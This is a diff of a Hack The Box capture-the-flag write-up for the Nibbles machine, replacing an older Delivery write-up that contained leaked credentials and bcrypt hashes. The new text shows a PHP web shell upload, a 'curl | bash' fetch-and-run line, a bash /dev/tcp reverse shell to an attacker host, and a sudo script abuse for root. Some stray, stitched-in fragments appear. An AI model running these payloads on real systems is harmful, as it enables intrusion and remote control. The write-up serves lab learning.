@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Nibbles - Hack The Box
-excerpt: ""
+excerpt: "Nibbles is a begginer-friendly machine on HackTheBox, designed to provide an excellent entry point for those new to ethical hacking and penetration testing. It offers a realistic environment to practise skills and tackle challenges in a controlled setting. As you explore and conquer its challenges, you'll develop essential skills and gain a deeper understanding of penetration testing techniques. In this machine we do enumeration, web application testing, exploitation, privilege escalation and capture the flag"
 date: 2023-07-23
 classes: wide
 header:
@@ -11,7 +11,7 @@ header:
 categories:
   - hackthebox
   - infosec
-tags:  
+tags: 
   - Easy
   - Web Enumeration
   - Basic Linux knowledge
@@ -19,7 +19,8 @@ tags:
 
 ![](/assets/images/htb-writeup-nibbles/nibbles_logo.png)
 
-Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.
+
+<nd capture the flag"
 
 ## VPN connection
 
@@ -35,7 +36,7 @@ We utilized the tool Nmap to perform a scan on the target IP address:
 ```bash
 $ sudo nmap 10.10.10.75 -p- -sS --min-rate 5000
 ```
-
+<br>
 Let's break down each part of the command:
 
 - `sudo`: We used `sudo`to execute Nmap with elevated privileges.
@@ -44,7 +45,10 @@ Let's break down each part of the command:
 - `-sS`: The flag `-sS`enables TCP SYN scan.
 - `--min-rate 5000`: We set the minimun sending rate to 5000 packets per second.
 
-After executing the command, Nmap show us that there are two ports open
+<br>
+<br>
+
+After executing the command, Nmap show us that there are two ports open.
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 16:46 CEST
 Nmap scan report for 10.10.10.75
@@ -54,9 +58,27 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 ```
-
+ <u>Output:</u>
+ After executing the command, Nmap will begin scanning all the 65535 ports on the target IP address. THe output will display a detailed report, listing the open ports and services found.
+<br>
+<br>
+<br>
+<br>
+Now we perform a targeted scan on the specific ports and using additional options for enhanced information gathering:
 ```bash
 $ sudo nmap 10.10.10.75 -p 22,80 -sCV -sS --min-rate 5000
+```
+<br>
+Let's delve into the new parts of the command:
+
+- `-p 22,80`: We use the `-p` flag to specify the ports we want to scan.
+- `-sCV`: The `-sCV` option combines two scan types:
+	- `-sC`: This option enables the default script scan. THis will identify vulnerabilities and gather additional information.
+	- `-sV`: This option enables version detection. Nmap will try to determine the version of the service.
+
+<br>
+
+```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 16:56 CEST
 Nmap scan report for 10.10.10.75
 Host is up (0.21s latency).
@@ -72,157 +94,250 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site doesn't have a title (text/html).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+ <u>Output:<u>
+ After executing the command, Nmap will specifically scan ports 22 and 80 on the target IP address. The output will present a report, including the services running on the port, versions and vulnerabilities.
+ 
 ## Website
 
-The Delivery website is pretty basic, there's a link to a vhost called helpdesk.delivery.htb and a contact us section. We'll add this entry to our local host before proceeding further.
+The design of the page is quite simple, so let's start by looking at the code of the page before listing directories.
 
-![](/assets/images/htb-writeup-delivery/website1.png)
+![](/assets/images/htb-writeup-nibbles/nibbles_page.png)
+<br>
+<br>
 
-The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.
+It seems we found something interesting hid on the code;)
 
-![](/assets/images/htb-writeup-delivery/website2.png)
+```bash
+<b>Hello world!</b>
 
-Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet
 
-![](/assets/images/htb-writeup-delivery/mm1.png)
 
-## Helpdesk
 
-The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.
 
-![](/assets/images/htb-writeup-delivery/helpdesk3.png)
 
-We can still open new tickets even if we only have a guest user.
 
-![](/assets/images/htb-writeup-delivery/helpdesk1.png)
 
-After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.
 
-![](/assets/images/htb-writeup-delivery/helpdesk2.png)
 
-Now that we have an email account we can create a MatterMost account.
 
-![](/assets/images/htb-writeup-delivery/mm2.png)
 
-A confirmation email is then sent to our ticket status inbox.
 
-![](/assets/images/htb-writeup-delivery/mm3.png)
 
-We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.
-
-![](/assets/images/htb-writeup-delivery/mm4.png)
-
-We're now logged in and we see that the MatterMost confirmation email has been added to the ticket information.
-
-![](/assets/images/htb-writeup-delivery/mm5.png)
-
-To confirm the creation of our account we'll just copy/paste the included link into a browser new tab.
-
-![](/assets/images/htb-writeup-delivery/mm6.png)
-
-After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There's also a hint that we'll have to use a variation of the `PleaseSubscribe!` password later.
-
-![](/assets/images/htb-writeup-delivery/mm7.png)
-
-## User shell
-
-With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the user flag.
-
-![](/assets/images/htb-writeup-delivery/user.png)
-
-## Credentials in MySQL database
-
-After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:
-
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
 ```
-maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
-matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
+> **Shortcut** To view the page source code, press `CTRL+U. 
+<br>
+<br>
+
+In the new page (http://10.10.10.75/nibbleblog/), there is nothing interesting. Let's try to find out new directories to see if there is something interesting.
+<br>
+<br>
+<br>
+Firstly, I starting Fuzzing on http://10.10.10.75/nibbleblog/
+<br>
+The command we use to fuzzing is:
+```bash
+wfuzz -c -t 200 --hc=404 -w  /opt/SecLists/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
+```
+> ** Important** Fuzzing is a testing technique used to discover vulnerabilities and defects in programs or systems. It involves sending a large amount of random input data to the target a>
+
+<br>
+
+Let's explain the command:
+- `wfuzz`: `wfuzz`is a flexible and web application fuzzer.
+- `-c`: This option stands for "colorize output".
+- `-t 200`: The `-t` option specifies the number of threads to use during the fuzzing process.
+- `--hc=404`: This option is used to specify the response status code to hide from the output.
+- `-w /opt/SecLists/directory-list-2.3-medium.txt`: The `-w` option specifies the wordlist file to use for fuzzing. In that case I used one that is here:[Dictionary](https://github.com/dan>
+- `http://10.10.10.75/nibbleblog/FUZZ.php`: This is the target URL that will be fuzzed. The `FUZZ` placeholder will be replaced with each directory name from the worlists during the fuzzing pr>
+
+> **Important** When adding `.php` at the end of the `wfuzz`command, you are trying to identify the programming language used by the web application. by appending `.php`to the URLs being fuzzed, you are attemting to find PHP files.
+<br>
+
+<u>Output</u>
+```bash
+000000259:   200        26 L     96 W       1401 Ch     "admin" 
 ```
 
-The `config.json` file contains the password for the MySQL database:
+There is one interesting page! Let's see admin.php(http://10.10.10.75/nibbleblog/admin.php).
+<br>
+<br>
+![](/assets/images/htb-writeup-nibbles/admin_nibbles.png)
 
+It seems we need a credential and a password. Let's look around maybe we find something.
+
+
+However with that it is not enough, so I started fuzzing on http://10.10.10.75/nibbleblog/ and I got interesting results.
+<br>
+<br>
+<br>
+
+We need to do fuzzing again:
+```bash
+wfuzz -c -t 200 --hc=404 -w /opt/SecLists/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ
 ```
-[...]
-"SqlSettings": {
-        "DriverName": "mysql",
-        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
-[...]
+<br>
+<br>
+<u>Output</u>
+```bash                     
+000000075:   301        9 L      28 W       323 Ch      "content" 
+000000259:   301        9 L      28 W       321 Ch      "admin"                         
+000000519:   301        9 L      28 W       323 Ch      "plugins"                       
+000000127:   301        9 L      28 W       322 Ch      "themes"                        
+000000935:   301        9 L      28 W       325 Ch      "languages"                     
+000000897:   200        63 L     643 W      4624 Ch     "README"   
 ```
+<br>
+<br>
+If we go to content there is a private directory where there are interesting information, specially in *config.xml*
 
-We'll connect to the database server and poke around.
-
-```
-maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 91
-Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
-
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-MariaDB [(none)]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mattermost         |
-+--------------------+
-```
-
-MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.
-
-```
-MariaDB [(none)]> use mattermost;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-MariaDB [mattermost]> select Username,Password from Users;
-+----------------------------------+--------------------------------------------------------------+
-| Username                         | Password                                                     |
-+----------------------------------+--------------------------------------------------------------+
-| surveybot                        |                                                              |
-| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
-| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
-| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
-| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
-| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
-| channelexport                    |                                                              |
-| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
-+----------------------------------+--------------------------------------------------------------+
-8 rows in set (0.002 sec)
-```
-
-## Cracking with rules
-
-There was a hint earlier that some variation of `PleaseSubscribe!` is used.
-
-I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.
-
-```
-C:\bin\hashcat>hashcat --help | findstr bcrypt
-   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
-```
-
-My go-to rules is normally one of those two ruleset:
-
-- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
-- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)
-
-These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`
-
-```
-C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
-[...]
-$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: bcrypt $2*$, Blowfish (Unix)
-[...]
+```xml
+<config>
+<name type="string">Nibbles</name>
+<slogan type="string">Yum yum</slogan>
+<footer type="string">Powered by Nibbleblog</footer>
+<advanced_post_options type="integer">0</advanced_post_options>
+<url type="string">http://10.10.10.75/nibbleblog/</url>
+<path type="string">/nibbleblog/</path>
+<items_rss type="integer">4</items_rss>
+<items_page type="integer">6</items_page>
+<language type="string">en_US</language>
+<timezone type="string">UTC</timezone>
+<timestamp_format type="string">%d %B, %Y</timestamp_format>
+<locale type="string">en_US</locale>
+<img_resize type="integer">1</img_resize>
+<img_resize_width type="integer">1000</img_resize_width>
+<img_resize_height type="integer">600</img_resize_height>
+<img_resize_quality type="integer">100</img_resize_quality>
+<img_resize_option type="string">auto</img_resize_option>
+<img_thumbnail type="integer">1</img_thumbnail>
+<img_thumbnail_width type="integer">190</img_thumbnail_width>
+<img_thumbnail_height type="integer">190</img_thumbnail_height>
+<img_thumbnail_quality type="integer">100</img_thumbnail_quality>
+<img_thumbnail_option type="string">landscape</img_thumbnail_option>
+<theme type="string">simpler</theme>
+<notification_comments type="integer">1</notification_comments>
+<notification_session_fail type="integer">0</notification_session_fail>
+<notification_session_start type="integer">0</notification_session_start>
+<notification_email_to type="string">admin@nibbles.com</notification_email_to>
+<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
+<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
+<seo_site_description type="string"/>
+<seo_keywords type="string"/>
+<seo_robots type="string"/>
+<seo_google_code type="string"/>
+<seo_bing_code type="string"/>
+<seo_author type="string"/>
+<friendly_urls type="integer">0</friendly_urls>
+<default_homepage type="integer">0</default_homepage>
+</config>
 ```
 
-The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.
+<br>
+If we pay attention there is a line with some relevant information:
+```bash
+<notification_email_to type="string">admin@nibbles.com</notification_email_to>
+```
+<br><br>
+Let's try to check if the user could be `admin` and the password is `nibbles`
+<br><br>
 
-![](/assets/images/htb-writeup-delivery/root.png)
+WE GET IT!!!
+![](/assets/images/htb-write-nibbles/admin_login2.png)
+<br><br>
+
+Now, we need to try to get a reverse shell, so let's go to plugins to upload some code and we can see that we can upload a file on `My image`. Let's try to do a **Remote Code Execution(RCE)** by uploading a PHP file with that code:
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+> **Important** In the provided code, the `system()`function is used, which allows the execution of shell commands. The `$REQUEST[\`cmd\`]` variable retrieves the value of the `cmd` parameter from the HTTP request, which contains the shell command the attacker wants to execute.
+<br><br>
+Now, we need to find on the directories we found doing fuzzing and try to search something called "my_image" and we get it on **/nibbleblog/content/private/plugins/my_image**.
+<br><br>
+If we click on our file and we add at the end of the PHP file that `?cmd=`(http://10.10.10.75/nibbleblog/content/private/plugins/my_image/), we will get a cmd where we can add commands. In my case I am going to do a reverse shell to make everything more comfortable.
+<br><br>
+
+![](/assets/images/htb-writeup-nibbles/reverse.png)
+In this reverse shell I used 3 windows where in each I used different tools:
+1. **RCE payload**:
+	- I execute the following RCE payload in the web application:
+	```
+	curl {IP} | bash
+	```
+	- This command uses `curl` to fetch data from the IP address `{LHOST}` and pipes it to the `bash` command for execution.
+
+2. **HTTP Server with Payload**:
+	- In another terminal, I has set up a HTTP server using Python3 to serve a payload file. The command used is:
+	```
+	python3 -m http.server 80
+	```
+	- The payload file, let's say `payload.sh`, contains the following code:
+	```
+   	bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
+	```
+	- This payload establishes a reverse shell to my machine with IP address `{LHOST}` on port `{LPORT}`. It uses `bash`to redirect standard input, output, and error to the specified TCP connection.
+
+3. **Execution of Payload**
+	- THe vulnerable web server downloads the `payload.sh` file from my machine's HTTP server using the `curl` command executed in the RCE payload.
+
+4. **Reverse Shell Connection**:
+	- Once the `payload.sh` is downloaded, it is executed on the server.
+	- The `bash`command in the payload establishes a reverse shell to my machine at IP `{LHOST}` on port `{LPORT}`, allowing me to intereact with the server's shell remotely.
+
+5. **Listener for Reverse Shell**:
+	- In a final terminal, the attacker runs the following command to listen for the incoming reverse shell connection:
+	```
+	nc -nvlp 443
+	```
+	- I need to wait for the connection from the server, and once established, I gain interactive access to the target system's shell.
+	 
+<br>
+Finally, I go to the directory /home/nibbler and we find the flag on `user.txt`.
+
+## Privilege Scalation
+Firstly lets list the priveleges or permissions that I have assigned, to do that I used the command `sudo -l`.
+<u>Output</u>
+```bash
+nibbler@Nibbles:/home/nibbler$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+```
+If we pay attention we find an interesting zip that is on nibbler directory called monitor.sh that we can execute as root.
+<br>
+It seems that file is on the personal.zip:
+
+```bash
+nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal
+user.txt
+```
+<br>
+<br>
+Let's unzip that file to see what's there with that command:
+```bash
+unzip personal
+```
+If we go to monitor.sh we have full permissions to modify the file, so I am gonna establish a reverse shell with my machine, to do that I am gonna write the command that was on `payload.sh` and I am going to execute with `sudo`as root:
+```bash
+sudo monitor.sh
+```
+<br>
+<br>
+Finally, we are root!!!
+<br>
+
+We have the flag here:
+```bash
+root@Nibbles:/home/nibbler/personal/stuff# cd /root
+cd /root
+root@Nibbles:~# ls
+ls
+root.txt
+
+```
